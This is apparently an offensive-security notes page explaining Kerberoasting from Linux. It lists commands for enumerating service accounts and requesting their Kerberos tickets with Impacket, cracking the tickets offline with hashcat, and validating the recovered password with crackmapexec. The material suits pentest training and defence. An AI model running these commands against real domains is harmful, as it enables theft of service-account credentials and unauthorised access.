# Kerberoasting - From Linux

## Kerberoasting Attack Process

<figure><img src="../.gitbook/assets/image (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Step 1: Fix Clock Skew Error

To fix the clock skew error, use the following commands:

```bash
timedatectl set-ntp off
sudo ntpdate 192.168.10.20
```

### Prerequisites

A prerequisite for performing Kerberoasting attacks is having domain user credentials (either cleartext or an NTLM hash, if using Impacket), a shell in the context of a domain user account, or a high-privileged account like SYSTEM. Once you gain this level of access, you can start. You also need to identify the Domain Controller within the domain to query it.

### Target of the Attack

This attack targets **Service Principal Names (SPN)** accounts.

SPNs are unique identifiers that Kerberos uses to map a service instance to a service account in whose context the service is running.

Any domain user can request a Kerberos ticket for any service account in the same domain.

**Depending on your position in a network, this attack can be performed in multiple ways:**

* From a non-domain joined Linux host using valid domain user credentials.
* From a domain-joined Linux host as root after retrieving the keytab file.
* From a domain-joined Windows host authenticated as a domain user.
* From a domain-joined Windows host with a shell in the context of a domain account.
* As SYSTEM on a domain-joined Windows host.
* From a non-domain joined Windows host using [runas](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc771525\(v=ws.11\)) /netonly.

#### Commands

* `Impacket-GetUserSPNs.py -dc-ip 192.168.10.20 DOMAIN.LOCAL/dollarboysushil` → list SPN accounts
* `Impacket-GetUserSPNs.py -dc-ip 192.168.10.20 DOMAIN.LOCAL/dollarboysushil -request` → Requesting all TGS tickets
* `Impacket-GetUserSPNs.py -dc-ip 192.168.10.20 DOMAIN.LOCAL/dollarboysushil -request-user sqldev` → Requesting a single TGS ticket.

We can use `-outputfile filename` flag to save the TGS ticket in a file.

* `hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt` → Cracking Ticket offline using Hashcat
* `sudo crackmapexec smb 192.168.10.20 -u sqldev -p database!` → Testing authentication against a domain controller
